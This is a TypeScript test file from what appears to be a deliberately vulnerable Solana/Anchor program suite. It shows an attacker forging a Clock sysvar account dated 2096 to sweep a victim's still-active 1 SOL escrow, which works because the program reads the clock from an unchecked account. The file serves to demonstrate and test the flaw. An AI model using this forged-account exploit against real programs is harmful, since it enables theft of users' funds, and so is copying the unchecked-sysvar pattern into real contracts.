/**
 * VULN 13 — attacker-supplied Clock sysvar.
 *
 * `sweep` pays the escrow of an "expired" order to the caller and reads the
 * Clock from an UNCHECKED account. The attacker forges an account whose
 * bytes deserialize into a Clock "in the year 2096" (via the attacker
 * program's forge mode) and sweeps the VICTIM'S ACTIVE order — one that
 * still has an hour left.
 */
import { assert } from "chai";
import { SYSVAR_CLOCK_PUBKEY } from "@solana/web3.js";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  nativeIx, sendTx, sendSelfSigned, solBalance, BN, LAMPORTS_PER_SOL, PublicKey, SystemProgram,
} from "./util";

describe("vuln13 forged Clock / active-order sweep", () => {
  const program = anchorProgram("vuln13_fake_sysvar", PROG_IDS.vuln13);
  const ORDER_ID = 1;
  const orderOf = (creator: PublicKey) =>
    findPda([seedsBuf("order")[0], creator.toBuffer(), new BN(ORDER_ID).toArrayLike(Buffer, "le", 8)], PROG_IDS.vuln13)[0];

  let victim: any, attacker: any, victimOrder: PublicKey;
  const CLOCK_SYSVAR = SYSVAR_CLOCK_PUBKEY;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    // Victim escrows 1 SOL in an order valid for another hour.
    victimOrder = orderOf(victim.publicKey);
    await program.methods.createOrder(new BN(ORDER_ID), new BN(LAMPORTS_PER_SOL), new BN(3600))
      .accounts({ order: victimOrder, creator: victim.publicKey })
      .signers([victim]).rpc();

    const order = await program.account.order.fetch(victimOrder);
    assert.equal(order.amount.toString(), LAMPORTS_PER_SOL.toString());
  });

  it("honest sweep is refused while the order is live", async () => {
    const ix = await program.methods.sweep(new BN(ORDER_ID))
      .accounts({ order: victimOrder, clock: CLOCK_SYSVAR, executor: attacker.publicKey })
      .instruction();
    try {
      await sendSelfSigned([ix], attacker);
      assert.fail("sweep should have failed");
    } catch (e: any) {
      assert.include(JSON.stringify(e), "NotExpired");
    }
  });

  it("attacker forges a Clock in the year 2096 and sweeps the ACTIVE order", async () => {
    // solana-program 2.x Clock: [slot, epoch_start_timestamp, epoch,
    // leader_schedule_epoch, unix_timestamp] — every field is filled with a
    // far-future value, so any read of unix_timestamp is "the year 2096".
    const FAR_FUTURE = 4_000_000_000;
    const payload = Buffer.alloc(40);
    for (let i = 0; i < 5; i++) payload.writeBigUInt64LE(BigInt(FAR_FUTURE), i * 8);

    const forgePda = findPda([seedsBuf("forge")[0], payload.subarray(0, 8)], PROG_IDS.attacker)[0];
    const forgeIx = nativeIx(
      PROG_IDS.attacker,
      1,
      payload,
      [
        { pubkey: forgePda, isSigner: false, isWritable: true },
        { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      ],
    );
    await sendTx([forgeIx], [attacker]);

    // DEBUG: the forged account must exist and carry exactly the 40-byte payload.
    const forged = await provider.connection.getAccountInfo(forgePda);
    assert.isNotNull(forged);
    assert.equal(forged!.data.length, 40, "forged clock must be 40 bytes");
    assert.equal(forged!.owner.toString(), PROG_IDS.attacker.toString());

    const attackerBefore = await solBalance(attacker.publicKey);
    const sweepIx = await program.methods.sweep(new BN(ORDER_ID))
      .accounts({ order: victimOrder, clock: forgePda, executor: attacker.publicKey })
      .instruction();
    await sendSelfSigned([sweepIx], attacker);

    // Escrow (1 SOL) + rent went to the attacker; the order is destroyed.
    const after = await solBalance(attacker.publicKey);
    assert.isAtLeast(after - attackerBefore, LAMPORTS_PER_SOL);
    const gone = await provider.connection.getAccountInfo(victimOrder);
    assert.isNull(gone);
  });

  it("the victim's order is gone — the escrow can never be returned", async () => {
    try {
      await program.methods.cancelOrder(new BN(ORDER_ID))
        .accounts({ order: victimOrder, creator: victim.publicKey })
        .signers([victim]).rpc();
      assert.fail("cancel should have failed");
    } catch (e: any) {
      // The order account no longer exists (AccountNotFound / NotInitialized).
      assert.include(JSON.stringify(e), "ccountNot");
    }
  });
});
